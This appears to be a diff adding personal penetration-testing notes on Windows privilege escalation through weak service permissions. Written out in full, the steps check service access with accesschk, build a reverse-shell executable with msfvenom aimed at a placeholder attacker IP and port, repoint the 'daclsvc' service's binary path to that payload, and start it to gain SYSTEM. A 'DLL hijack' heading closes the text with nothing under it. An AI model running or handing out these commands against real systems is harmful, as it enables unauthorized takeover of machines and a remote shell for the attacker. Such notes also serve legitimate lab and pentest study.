@@ -1,0 +1,29 @@
+#### Service weak permission abuse ####
+
+accesschk64.exe -uwcqv "Authenticated Users" * /accepteula				# check the vulnerable services
+accesschk64.exe -vwuc user daclsvc                 # check if user "user" accesses to daclsvc
+accesschk64.exe -ucqv daclsvc									# check the vulnerable service's permission
+
+Looking for 
+1. SERVICE_CHANGE_CONFIG
+2. SERVICE_START
+3. SERVICE_STOP
+
+
+# sc qc daclsvc
+
+# generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+
+
+now upload the payload and change the binary_path_name to our payload
+
+
+sc config daclsvc binpath="C:\Users\Public\shell-x64.exe"
+
+# start the service and easy "system NT"
+sc start daclsvc
+
+
+
+#### DLL hijack ####
